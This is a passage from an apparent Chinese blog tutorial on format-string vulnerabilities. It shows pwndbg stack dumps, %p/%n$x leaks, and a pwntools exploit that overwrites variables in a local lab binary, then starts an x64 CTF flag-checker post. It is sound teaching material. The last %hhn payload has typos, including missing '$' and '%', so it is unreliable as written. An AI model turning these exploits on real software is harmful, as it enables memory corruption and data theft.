<br>00000001.22222222.ffffffff.%p.%p.%p<br>0xffaf3400.0xe88767b0.0x804919d<br></code></pre></td></tr></table></figure><p>由于栈上的数据会因为每次分配的内存页不同，并不是每次得到的结果都一样，上面的方法一直都是依次输出栈中的每个参数，要输入一个特定位置的内容就需要更改一下输入的内容。即：</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos"><span class="hljs-built_in">%n</span><span class="hljs-built_in">$x</span><br></code></pre></td></tr></table></figure><p>第二次实验：</p><p>gdb打开程序，在printf处下断点</p><p>栈空间：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asm">00:0000│ esp 0xffffcfbc —▸ 0x80491f9 (main+115) ◂— add esp, 0x10<br>01:0004│-088 0xffffcfc0 —▸ 0xffffcfd0 ◂— &#x27;%3$x&#x27;<br>02:0008│-084 0xffffcfc4 —▸ 0xffffcfd0 ◂— &#x27;%3$x&#x27;<br>03:000c│-080 0xffffcfc8 —▸ 0xf7fbe7b0 —▸ 0x80482c2 ◂— &#x27;GLIBC_2.34&#x27;<br>04:0010│-07c 0xffffcfcc —▸ 0x804919d (main+23) ◂— add ebx, 0x2e63<br>05:0014│ eax 0xffffcfd0 ◂— &#x27;%3$x&#x27;<br>06:0018│-074 0xffffcfd4 ◂— 0x0<br>07:001c│-070 0xffffcfd8 —▸ 0xf7ffda40 ◂— 0x0<br></code></pre></td></tr></table></figure><p>正常输出</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">pwndbg&gt; <span class="hljs-keyword">c</span><br>Continuing.<br><span class="hljs-number">00000001.22222222</span>.ffffffff.<span class="hljs-variable">%3</span>$<span class="hljs-keyword">x</span><br></code></pre></td></tr></table></figure><p>继续c，看printf(s)处会发生什么，按所输入的%3$x来说，应该会解析格式化字符串函数下面第三个参数也就是下面所说的0x804919d</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00</span>:<span class="hljs-number">0000</span>│ esp <span class="hljs-number">0</span>xffffcfbc —▸ <span class="hljs-number">0</span>x80491f9 (main+<span class="hljs-number">115</span>) ◂— add esp, <span class="hljs-number">0</span>x10<br><span class="hljs-attribute">01</span>:<span class="hljs-number">0004</span>│-<span class="hljs-number">088</span> <span class="hljs-number">0</span>xffffcfc0 —▸ <span class="hljs-number">0</span>xffffcfd0 ◂— &#x27;%<span class="hljs-number">3</span>$x&#x27;//格式化字符串位置<br><span class="hljs-attribute">02</span>:<span class="hljs-number">0008</span>│-<span class="hljs-number">084</span> <span class="hljs-number">0</span>xffffcfc4 —▸ <span class="hljs-number">0</span>xffffcfd0 ◂— &#x27;%<span class="hljs-number">3</span>$x&#x27;//第一个<br><span class="hljs-attribute">03</span>:<span class="hljs-number">000</span>c│-<span class="hljs-number">080</span> <span class="hljs-number">0</span>xffffcfc8 —▸ <span class="hljs-number">0</span>xf7fbe7b0 —▸ <span class="hljs-number">0</span>x80482c2 ◂— &#x27;GLIBC_2.<span class="hljs-number">34</span>&#x27;//第二个<br><span class="hljs-attribute">04</span>:<span class="hljs-number">0010</span>│-<span class="hljs-number">07</span>c <span class="hljs-number">0</span>xffffcfcc —▸ <span class="hljs-number">0</span>x804919d (main+<span class="hljs-number">23</span>) ◂— add ebx, <span class="hljs-number">0</span>x2e63//第三个<br><span class="hljs-attribute">05</span>:<span class="hljs-number">0014</span>│ eax <span class="hljs-number">0</span>xffffcfd0 ◂— &#x27;%<span class="hljs-number">3</span>$x&#x27;<br><span class="hljs-attribute">06</span>:<span class="hljs-number">0018</span>│-<span class="hljs-number">074</span> <span class="hljs-number">0</span>xffffcfd4 ◂— <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">07</span>:<span class="hljs-number">001</span>c│-<span class="hljs-number">070</span> <span class="hljs-number">0</span>xffffcfd8 —▸ <span class="hljs-number">0</span>xf7ffda40 ◂— <span class="hljs-number">0</span>x0<br></code></pre></td></tr></table></figure><p>输出：（跟预想的一致）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">pwndbg&gt; c<br>Continuing.<br>804919d[Inferior 1 (process 4347) exited normally]<br></code></pre></td></tr></table></figure><p>如果是%2$x就是输出格式化字符串指令的下面的第二个参数</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>│ <span class="hljs-built_in">esp</span> <span class="hljs-number">0xffffcfbc</span> —▸ <span class="hljs-number">0x80491f9</span> (main+<span class="hljs-number">115</span>) ◂— <span class="hljs-keyword">add</span> <span class="hljs-built_in">esp</span>, <span class="hljs-number">0x10</span><br><span class="hljs-number">01</span>:<span class="hljs-number">0004</span>│-<span class="hljs-number">088</span> <span class="hljs-number">0xffffcfc0</span> —▸ <span class="hljs-number">0xffffcfd0</span> ◂— <span class="hljs-string">&#x27;%2$x&#x27;</span><br><span class="hljs-number">02</span>:<span class="hljs-number">0008</span>│-<span class="hljs-number">084</span> <span class="hljs-number">0xffffcfc4</span> —▸ <span class="hljs-number">0xffffcfd0</span> ◂— <span class="hljs-string">&#x27;%2$x&#x27;</span><br><span class="hljs-number">03</span>:000c│-<span class="hljs-number">080</span> <span class="hljs-number">0xffffcfc8</span> —▸ <span class="hljs-number">0xf7fbe7b0</span> —▸ <span class="hljs-number">0x80482c2</span> ◂— <span class="hljs-string">&#x27;GLIBC_2.34&#x27;</span><br><span class="hljs-number">04</span>:<span class="hljs-number">0010</span>│-07c <span class="hljs-number">0xffffcfcc</span> —▸ <span class="hljs-number">0x804919d</span> (main+<span class="hljs-number">23</span>) ◂— <span class="hljs-keyword">add</span> <span class="hljs-built_in">ebx</span>, <span class="hljs-number">0x2e63</span><br><span class="hljs-number">05</span>:<span class="hljs-number">0014</span>│ <span class="hljs-built_in">eax</span> <span class="hljs-number">0xffffcfd0</span> ◂— <span class="hljs-string">&#x27;%2$x&#x27;</span><br><span class="hljs-number">06</span>:<span class="hljs-number">0018</span>│-<span class="hljs-number">074</span> <span class="hljs-number">0xffffcfd4</span> ◂— <span class="hljs-number">0x0</span><br><span class="hljs-number">07</span>:001c│-<span class="hljs-number">070</span> <span class="hljs-number">0xffffcfd8</span> —▸ <span class="hljs-number">0xf7ffda40</span> ◂— <span class="hljs-number">0x0</span><br><br> ► <span class="hljs-number">0</span> <span class="hljs-number">0xf7c57a90</span> printf<br>   <span class="hljs-number">1</span> <span class="hljs-number">0x80491f9</span> main+<span class="hljs-number">115</span><br>   <span class="hljs-number">2</span> <span class="hljs-number">0xf7c21519</span> __libc_start_call_main+<span class="hljs-number">121</span><br>   <span class="hljs-number">3</span> <span class="hljs-number">0xf7c215f3</span> __libc_start_main+<span class="hljs-number">147</span><br>   <span class="hljs-number">4</span> <span class="hljs-number">0x804909c</span> _start+<span class="hljs-number">44</span><br>   <br>────────────────────────────────────────────────────────────────────────────────────────────────────────────<br>pwndbg&gt; c<br>Continuing.<br>f7fbe7b0[Inferior <span class="hljs-number">1</span> (process <span class="hljs-number">4493</span>) exited normally]<br><br></code></pre></td></tr></table></figure><p>但是我们实际上输出的是printf的第四个参数，因为格式化字符串就是printfi函数的其中一个参数。这样我们就可以不用遍历整个栈，能够指定输出某个栈上的内容。</p><h4 id="获取栈变量对应的字符串"><a href="#获取栈变量对应的字符串" class="headerlink" title="获取栈变量对应的字符串"></a>获取栈变量对应的字符串</h4><p>其实就是把前面格式化字符串的x改成s就行，%s会以字符串的形式输出栈地址中的内容 </p><p>小技巧总结：<br>    利用%x来获取对应栈的内存，但建议使用%p,可以不用考虑位数的区别。<br>    利用%s来获取变量所对应地址的内容，只不过有零截断。<br>    利用%order$x来获取指定参数的值，利用%order$s来获取指定参数对应地址的内容。</p><h4 id="泄露任意地址内存"><a href="#泄露任意地址内存" class="headerlink" title="泄露任意地址内存"></a>泄露任意地址内存</h4><p>如果我们想要泄露某个libc函数的got表内容，从而得到其地址，进而获取libc版本以及其他函数的地址，这时候能够完全控制泄露某个指定地址的内存就很重要了，一般来说在格式化字符串漏洞中，我们读取的格式化字符串都在栈上，也就是说在调用输出函数的时候，其实第一个参数的地址就是该格式化字符串的地址</p><p>由于可以控制格式化字符串，所以只要知道格式化字符串在输出函数调用时是第几个参数，假设改格式化字符串相对函数调用为第k个参数，就可以通过addr%k$s</p><h4 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h4><p>前面可以通过格式化字符串来泄露栈内存以及任意内存地址，也可以进行覆盖内存，直接修改栈上变量的值，需要一个东西有能写的能力，这里就用上了%n</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">n</span></span>:不输出字符，但是把已经成功输出的字符个数写入对应的整形指针参数所指的变量。<br></code></pre></td></tr></table></figure><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs excel">%<span class="hljs-built_in">n</span>需要这样用：<br>...[overwrite addr ]...%[ oxerwrite <span class="hljs-built_in">offset</span> ]$<span class="hljs-built_in">n</span><br></code></pre></td></tr></table></figure><p>其中…表示我们的填充内容，overwrite addr表示我们所要覆盖的地址，overwrite offset地址表示我们所要覆盖的地址储存的位置为输出函数的格式化字符串的第几个参数</p><p>一般来说，利用分为以下几个步骤：</p><p>1.确定覆盖地址</p><p>2.确定相对偏移（找格式化字符串的第几个参数）</p><p>3.进行覆盖</p><p>例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> a=<span class="hljs-number">123</span>,b=<span class="hljs-number">456</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-type">int</span> c=<span class="hljs-number">789</span>;<br><span class="hljs-type">char</span> s[<span class="hljs-number">100</span>];<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,&amp;c);<br><br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,s);<br><br><span class="hljs-built_in">printf</span>(s);<br><span class="hljs-keyword">if</span>(c==<span class="hljs-number">16</span>)&#123;<br> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified c.&quot;</span>);<br> &#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (a ==<span class="hljs-number">2</span>)&#123;<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified a for a small number.&quot;</span>);<br> &#125;<br> <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(b==<span class="hljs-number">0x12345678</span>)&#123;<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified b for a big number!&quot;</span>);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//简单的讲一下这个例子，三个整型变量a=123、b=456、c=789。a、b是全局变量，c是局部变量，数组s等待我们从scanf函数输入。可以明显的看</span><br><span class="hljs-comment">//到第二个printf函数存在格式化字符串漏洞。最后是三个判断，如果c=16就打印“modified c.”,如果a=2就打印“modified a for a small</span><br><span class="hljs-comment">//number.”,如果b=0x12345678就打印“modified b for a big number!!”</span><br></code></pre></td></tr></table></figure><p>gcc -32进行编译</p><h4 id="覆盖栈内存"><a href="#覆盖栈内存" class="headerlink" title="覆盖栈内存"></a>覆盖栈内存</h4><p>这里选择让c&#x3D;16，使程序打印“modified.c”，可以从源码中看到第一次printf打印出了变量c的地址，不需要去找c地址了</p><p>首先通过前面的方法来测试c变量在格式化字符串的第几个参数</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos">AAAA<span class="hljs-built_in">%p</span><span class="hljs-built_in">%p</span><span class="hljs-built_in">%p</span><span class="hljs-built_in">%p</span><span class="hljs-built_in">%p</span><span class="hljs-built_in">%p</span><span class="hljs-built_in">%p</span><span class="hljs-built_in">%p</span><span class="hljs-built_in">%p</span><span class="hljs-built_in">%p</span><span class="hljs-built_in">%p</span><span class="hljs-built_in">%p</span><span class="hljs-built_in">%p</span><span class="hljs-built_in">%p</span><span class="hljs-built_in">%p</span><span class="hljs-built_in">%p</span><span class="hljs-built_in">%p</span><span class="hljs-built_in">%p</span><br></code></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">lpp@lpp-virtual-machine:~/test$ ./00<br>0xff9d6bec<br>AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p<br>AAAA0xff9d6b880xe9ce97b00x80491ad(nil)0x10x414141410x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x70257025(nil)(nil)0x1000000<br></code></pre></td></tr></table></figure><p>可以看出来变量c在格式化字符串的第六个参数，可以根据上面说的公式来构造payload</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">c_addr+%012d+%6$n<br></code></pre></td></tr></table></figure><p>第一个是变量c的地址，可以通过接受第一次printf打印的字符来获得，因为前面的c_addr已经占了4个字节，第二个的%012d是为了补全十六个字节，最后的%6$n是为了向第六个参数内写16，这个16就是前面的16个字节，因为前面两个已经成功输出了16个字符，%6$n把成功输出的十六个字符的字符个数16对应的整形指针（这里是变量c的指针）参数所指的变量。也就是变量c。<br>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>sh=process(<span class="hljs-string">&#x27;./00&#x27;</span>)<br>c_addr=<span class="hljs-built_in">int</span>(sh.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)<span class="hljs-comment">#获取c变量的地址</span><br><span class="hljs-built_in">print</span> (<span class="hljs-built_in">hex</span>(c_addr))<br>payload=p32(c_addr)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">12</span> +<span class="hljs-string">b&#x27;%6$n&#x27;</span><span class="hljs-comment">#payload</span><br>sh.sendline(payload)<br><span class="hljs-built_in">print</span> (sh.recv())<br>sh.interactive()<span class="hljs-comment">#%n,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量</span><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs asm">lpp@lpp-virtual-machine:~/test$ python3 00.py<br>[+] Starting local process &#x27;./00&#x27; argv=[b&#x27;./00&#x27;] : pid 5471<br>/home/lpp/test/00.py:4: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes<br>  c_addr=int(sh.recvuntil(&#x27;\n&#x27;,drop=True),16)#获取c变量的地址<br>[DEBUG] Received 0xb bytes:<br>    b&#x27;0xffcb057c\n&#x27;<br>0xffcb057c<br>[DEBUG] Sent 0x15 bytes:<br>    00000000  7c 05 cb ff  61 61 61 61  61 61 61 61  61 61 61 61  │|···│aaaa│aaaa│aaaa│<br>    00000010  25 36 24 6e  0a                                     │%6$n│·│<br>    00000015<br>[*] Process &#x27;./00&#x27; stopped with exit code 0 (pid 5471)<br>[DEBUG] Received 0x1c bytes:<br>    00000000  7c 05 cb ff  61 61 61 61  61 61 61 61  61 61 61 61  │|···│aaaa│aaaa│aaaa│<br>    00000010  6d 6f 64 69  66 69 65 64  20 63 2e 0a               │modi│fied│ c.·│<br>    0000001c<br>b&#x27;|\x05\xcb\xffaaaaaaaaaaaamodified c.\n&#x27;<br>[*] Switching to interactive mode<br>[*] Got EOF while reading in interactive<br>$ <br><br></code></pre></td></tr></table></figure><p>确实成功输出modified.c了</p><h4 id="覆盖任意地址内存"><a href="#覆盖任意地址内存" class="headerlink" title="覆盖任意地址内存"></a>覆盖任意地址内存</h4><h5 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字:"></a>覆盖小数字:</h5><p>小是小于机器字长，假设要向变量中存一个2的话，如果靠覆盖栈内存这种方法的话就失效了，%n会将前面输入的字节数存放到指定的参数地址中，我们将地址放到了最前面，p32小端序转化后本身就会占4个字节，所以经过%n写入的一定会大于等于4，就不能去存2，还是上面那个例子，我们令a&#x3D;2，去输出puts(“modified a for a small number.”);</p><p>但是地址一定要放在最前面吗？<br>%n是可以向指定的参数地址写入数字的，把payload改一下</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-string">&#x27;aa%k$naa&#x27;</span>+<span class="hljs-function"><span class="hljs-title">p32</span>(<span class="hljs-variable">a_addr</span>)</span><br></code></pre></td></tr></table></figure><p>看起来毫无逻辑，改进</p><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme"><span class="hljs-symbol">&#x27;aa%k</span><span class="hljs-symbol">&#x27;+</span><span class="hljs-symbol">&#x27;$naa</span><span class="hljs-symbol">&#x27;+p32</span>(<span class="hljs-name">a_addr</span>)<br></code></pre></td></tr></table></figure><p>把前面的字符串拆分成两个部分，每个部分四个字节，因为变量是从第六个参数开始的，所以aa%k是第六个，%naa是第七个，p32(a_addr)是第八个，所以k需要改成8这样%n就会将‘aa’这两个字符的字符数2写在第八个参数，即变量a的地址中</p><h5 id="覆盖大数字："><a href="#覆盖大数字：" class="headerlink" title="覆盖大数字："></a>覆盖大数字：</h5><p>%k$n前面有多少字节，就会向第k个参数地址中写多少，我们能覆盖的大数字有多大呢，上面的例子b&#x3D;0x12345678举例，换成十进制就是305419896个字节，我们没办法构建一个超极长的payload的插入栈中，因为栈的长度基本不会这么长。</p><p>所以我们可以进行分开写入，存放变量b的地址空间有四个字节:</p><p>因为在x86，x64中按照小端序的形式进行存储，所以以b_addr作为基地址开始，依次从右向左在每个字节中写入内容，也就是说我们不必须一次性把变量b的所有位置填满，可以一个字节一个字节的填充，这样的填充方法需要用到格式化字符串的两个标志位：<br>h:     对于整数类型，printf期待一个从short提升的int尺寸的整型参数</p><p>hh:   对于整数类型，printf期待一个从char提升的int尺寸的整型参数</p><p>简单说如果去使用了h标志位，那么就会向变量b中一次性写两个字节，写两次填满，使用hh标志位会向变量b中一次性写一个字节，写四次填满，所以</p><p>思路：如果b_addr放在格式化字符串的第六个参数，b_addr+1放在第七个参数，b_addr+2放在第八个参数，b_addr+3放在第九个参数的位置，再通过%6hhn，%7hhn，&amp;8hhn%，9hhn将0x78，0x56，0x34，0x12写进去理论上就可以完成对变量b的四个字节的填充b&#x3D;0x12345678，然后寻找b的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=p32(b_addr)+p32(b_addr+<span class="hljs-number">1</span>)+p32(b_addr+<span class="hljs-number">2</span>)+p32(b_addr+<span class="hljs-number">3</span>)<br><br>payload+=<span class="hljs-string">b&#x27;%104x&#x27;</span>+<span class="hljs-string">b&#x27;%6$hhn&#x27;</span>+<span class="hljs-string">b&#x27;%222x&#x27;</span>+<span class="hljs-string">b&#x27;%7hhn&#x27;</span>+<span class="hljs-string">b&#x27;%222x&#x27;</span>+<span class="hljs-string">b&#x27;%8hhn&#x27;</span>+<span class="hljs-string">b&#x27;222x&#x27;</span>+<span class="hljs-string">b&#x27;%9hhn&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/09/16/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E(x64)/"/>
    <url>/2024/09/16/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E(x64)/</url>
    
    <content type="html"><![CDATA[<h2 id="格式化字符串漏洞-x64"><a href="#格式化字符串漏洞-x64" class="headerlink" title="格式化字符串漏洞(x64)"></a>格式化字符串漏洞(x64)</h2><p>主函数程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> v4; <span class="hljs-comment">// [rsp+3h] [rbp-3Dh]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+4h] [rbp-3Ch]</span><br>  <span class="hljs-type">int</span> j; <span class="hljs-comment">// [rsp+4h] [rbp-3Ch]</span><br>  <span class="hljs-type">char</span> *format; <span class="hljs-comment">// [rsp+8h] [rbp-38h] BYREF</span><br>  _IO_FILE *fp; <span class="hljs-comment">// [rsp+10h] [rbp-30h]</span><br>  <span class="hljs-type">char</span> *v9; <span class="hljs-comment">// [rsp+18h] [rbp-28h]</span><br>  <span class="hljs-type">char</span> v10[<span class="hljs-number">24</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-20h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v11; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span><br><br>  v11 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  fp = fopen(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">21</span>; ++i )<br>    v10[i] = _IO_getc(fp);<br>  fclose(fp);<br>  v9 = v10;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;what&#x27;s the flag&quot;</span>);<br>  fflush(_bss_start);<br>  format = <span class="hljs-number">0LL</span>;<br>  __isoc99_scanf(<span class="hljs-string">&quot;%ms&quot;</span>, &amp;format);<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">21</span>; ++j )<br>  &#123;<br>    v4 = format[j];<br>    <span class="hljs-keyword">if</span> ( !v4 || v10[j] != v4 )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You answered:&quot;</span>);<br>      <span class="hljs-built_in">printf</span>(format);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nBut that was totally wrong lol get rekt&quot;</span>);<br>      fflush(_bss_start);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;That&#x27;s right, the flag is %s\n&quot;</span>, v9);<br>  fflush(_bss_start);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个程序的主要功能是从名为”flag.txt”的文件中读取一个flag，然后要求用户输入一个字符串。程序会逐个比较用户输入的字符串和flag中对应位置的字符，如果全部匹配则输出flag，否则输出错误信息。程序的逻辑流程如下：</p><ol><li>打开名为”flag.txt”的文件，读取其中的flag。</li><li>要求用户输入一个字符串。</li><li>逐个比较用户输入的字符串和flag中对应位置的字符。</li><li>如果用户输入的字符串与flag完全匹配，则输出flag。</li><li>如果用户输入的字符串有任何字符不匹配或长度不足，则输出错误信息。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs asm">RAX  0x0<br> RBX  0x0<br>*RCX  0x7ffff7d14887 (write+23) ◂— cmp rax, -0x1000 /* &#x27;H=&#x27; */<br>*RDX  0x1<br>*RDI  0x602ca0 ◂— 0x313131313131 /* &#x27;111111&#x27; */<br>*RSI  0x1<br>*R8   0x7ffff7e1ca70 (_IO_stdfile_1_lock) ◂— 0x0<br>*R9   0x602ca0 ◂— 0x313131313131 /* &#x27;111111&#x27; */<br>*R10  0x7ffff7c15cc0 ◂— 0xf00120000481e<br>*R11  0x7ffff7c606f0 (printf) ◂— endbr64 <br>*R12  0x7fffffffdf68 —▸ 0x7fffffffe2e0 ◂— &#x27;/home/lpp/test2/goodluck&#x27;<br>*R13  0x4007a6 (main) ◂— push rbp<br> R14  0x0<br>*R15  0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0x0<br>*RBP  0x7fffffffde50 ◂— 0x1<br>*RSP  0x7fffffffde08 —▸ 0x400890 (main+234) ◂— mov edi, 0x4009b8<br>*RIP  0x7ffff7c606f0 (printf) ◂— endbr64 <br><br></code></pre></td></tr></table></figure><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">复习一下<span class="hljs-number">64</span>位程序中参数的传递方式：<br>当参数少于<span class="hljs-number">7</span>个时，参数从左到右放入寄存器：<span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">rdx</span>,<span class="hljs-built_in">rcx</span>,<span class="hljs-built_in">r8</span>,<span class="hljs-built_in">r9</span>。<br>当参数为<span class="hljs-number">7</span>个及以上时，前<span class="hljs-number">6</span>个与前面一样，但后面的依次放入栈中，即和<span class="hljs-number">32</span>位程序一样<br></code></pre></td></tr></table></figure><p>先往寄存器上看，因为格式化字符串作为printf函数的第一个参数，所以理所当然的存放在rdi寄存器，剩下的rsi，rdx，rck，r8，r9这五个寄存器会接着存放其他参数，寄存器参数存放完毕，下面的参数就要进入栈中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 